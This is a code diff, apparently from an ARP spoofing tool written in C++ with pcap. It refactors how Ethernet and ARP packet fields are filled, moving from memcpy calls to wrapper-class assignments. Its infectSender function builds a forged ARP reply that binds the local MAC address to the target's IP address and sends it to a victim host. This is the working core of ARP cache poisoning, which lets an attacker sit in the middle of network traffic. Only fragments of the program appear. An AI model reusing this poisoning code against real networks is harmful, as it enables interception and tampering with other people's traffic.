@@ -21,17 +21,14 @@ int receiveSenderMacAddress(IN pcap_t *handle, IN IpManager senderIpAddress, OUT
 
         // parse Ethernet in Datalink Layer
         MergedStructure *mergedPacket = (MergedStructure *)packet;
-        IpManager  senderIpAddress(mergedPacket->arpPacket.senderProtocolAddress);
-        MacManager destinationMacAddress(mergedPacket->ethernetPacket.destinationMacAddress);
-        MacManager sourceMacAddress(mergedPacket->ethernetPacket.sourceMacAddress);
 
         switch(ntohs(mergedPacket->ethernetPacket.type)) {
             case ETHERNET_TYPE_ARP: // value is 0x0806
-                if(!memcmp(mergedPacket->arpPacket.senderProtocolAddress, senderIpAddress, ARP_PROTOCOL_LENGTH_IP)) {
+                if(mergedPacket->arpPacket.senderProtocolAddress == senderIpAddress) {
                     // Print Ethernet Packet
                     printf("[*] Ethernet Information\n");
-                    destinationMacAddress.printMacAddress("  - Dest MAC : ");
-                    sourceMacAddress.printMacAddress     ("  - Src  MAC : ");
+                    mergedPacket->ethernetPacket.destinationMacAddress.printMacAddress("  - Dest MAC : ");
+                    mergedPacket->ethernetPacket.sourceMacAddress.printMacAddress     ("  - Src  MAC : ");
                     printf("  - Type     : [%04x]\n",    ntohs(mergedPacket->ethernetPacket.type));
 
                     // Print ARP Packet
@@ -61,10 +58,10 @@ int getSenderMacAddress(IN pcap_t *handle,
     MergedStructure mergedPacket;
 
     // set source MAC Address for Ethernet
-    memcpy(mergedPacket.ethernetPacket.sourceMacAddress, targetMacAddress, ARP_HARDWARE_LENGTH_ETHERNET);
+    mergedPacket.ethernetPacket.sourceMacAddress = targetMacAddress;
 
     // set destination MAC Address for Ethernet
-    memset(mergedPacket.ethernetPacket.destinationMacAddress, 0xFF, ARP_HARDWARE_LENGTH_ETHERNET);
+    mergedPacket.ethernetPacket.destinationMacAddress.setBroadcast();
 
     // set Ethernet Type
     mergedPacket.ethernetPacket.type = htons(ETHERNET_TYPE_ARP);
@@ -77,16 +74,13 @@ int getSenderMacAddress(IN pcap_t *handle,
     mergedPacket.arpPacket.operationCode  = htons(ARP_OPERATION_REQUEST);
 
     // set source MAC Address for ARP
-    memcpy(mergedPacket.arpPacket.senderHardwareAddress, targetMacAddress, ARP_HARDWARE_LENGTH_ETHERNET);
-
-    // set destination MAC Address
-    memset(mergedPacket.arpPacket.targetHardwareAddress, 0x00, ARP_HARDWARE_LENGTH_ETHERNET);
+    mergedPacket.arpPacket.senderHardwareAddress = targetMacAddress;
 
     // set source IP Address
-    memcpy(mergedPacket.arpPacket.senderProtocolAddress, targetIpAddress, ARP_PROTOCOL_LENGTH_IP);
+    mergedPacket.arpPacket.senderProtocolAddress = targetIpAddress;
 
     // set destination IP Address 
-    memcpy(mergedPacket.arpPacket.targetProtocolAddress, senderIpAddress, ARP_PROTOCOL_LENGTH_IP);
+    mergedPacket.arpPacket.targetProtocolAddress = senderIpAddress;
 
     printf("[+] Initialize\n");
     printArpPacketInfo(mergedPacket.arpPacket);
@@ -101,7 +95,6 @@ int getSenderMacAddress(IN pcap_t *handle,
         printf("\n");
 
         printf("[+] Get MAC Address\n");
-        //memset(mergedPacket.arpPacket.senderHardwareAddress, 0x00, ARP_HARDWARE_LENGTH_ETHERNET);
         if(receiveSenderMacAddress(handle, senderIpAddress, senderMacAddress) == EXIT_SUCCESS) {
             break;
         }
@@ -123,10 +116,10 @@ int infectSender(IN pcap_t *handle, IN MacManager localMacAddress, IN ArpSession
     MergedStructure mergedStructure;
 
     // set source MAC Address for Ethernet
-    memcpy(mergedStructure.ethernetPacket.sourceMacAddress, localMacAddress, ARP_HARDWARE_LENGTH_ETHERNET);
+    mergedStructure.ethernetPacket.sourceMacAddress = localMacAddress;
 
     // set destination MAC Address for Ethernet
-    memcpy(mergedStructure.ethernetPacket.destinationMacAddress, arpSession.senderMacAddress, ARP_HARDWARE_LENGTH_ETHERNET);
+    mergedStructure.ethernetPacket.destinationMacAddress = arpSession.senderMacAddress;
 
     // set Ethernet Type
     mergedStructure.ethernetPacket.type = htons(ETHERNET_TYPE_ARP);
@@ -139,16 +132,16 @@ int infectSender(IN pcap_t *handle, IN MacManager localMacAddress, IN ArpSession
     mergedStructure.arpPacket.operationCode  = htons(ARP_OPERATION_REPLY);
 
     // set sender MAC Address for ARP
-    memcpy(mergedStructure.arpPacket.senderHardwareAddress, localMacAddress, ARP_HARDWARE_LENGTH_ETHERNET);
+    mergedStructure.arpPacket.senderHardwareAddress = localMacAddress;
 
     // set target MAC Address for ARP
-    memcpy(mergedStructure.arpPacket.targetHardwareAddress, arpSession.senderMacAddress, ARP_HARDWARE_LENGTH_ETHERNET);
+    mergedStructure.arpPacket.targetHardwareAddress = arpSession.senderMacAddress;
 
     // set source IP Address
-    memcpy(mergedStructure.arpPacket.senderProtocolAddress, arpSession.targetIpAddress, ARP_PROTOCOL_LENGTH_IP);
+    mergedStructure.arpPacket.senderProtocolAddress = arpSession.targetIpAddress;
 
     // set destination IP Address
-    memcpy(mergedStructure.arpPacket.targetProtocolAddress, arpSession.senderIpAddress, ARP_PROTOCOL_LENGTH_IP);
+    mergedStructure.arpPacket.targetProtocolAddress = arpSession.senderIpAddress;
 
     printf("[+] Initialize\n");
     printArpPacketInfo(mergedStructure.arpPacket);
